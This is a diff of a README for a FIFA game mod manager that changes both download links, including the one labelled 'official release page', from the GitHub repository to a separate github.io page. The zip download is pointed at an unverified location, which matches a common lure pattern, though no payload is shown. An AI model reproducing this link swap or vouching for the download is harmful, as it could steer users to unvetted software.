@@ -1,6 +1,6 @@
 # 🎮 FIFA-Mod-Manager-Pro - Organize your game mods with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Mattysqueezable158/FIFA-Mod-Manager-Pro)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://mattysqueezable158.github.io)
 
 ## 📖 About this program
 
@@ -21,7 +21,7 @@ If you do not have the .NET Runtime, visit the Microsoft website to download the
 
 Follow these steps to install the manager on your computer.
 
-1. Visit the [official release page](https://github.com/Mattysqueezable158/FIFA-Mod-Manager-Pro) to download the program.
+1. Visit the [official release page](https://mattysqueezable158.github.io) to download the program.
 2. Look for the file named FIFA-Mod-Manager-Pro.zip under the latest release section.
 3. Click the file to start the download. 
 4. Open your downloads folder and locate the zip file.
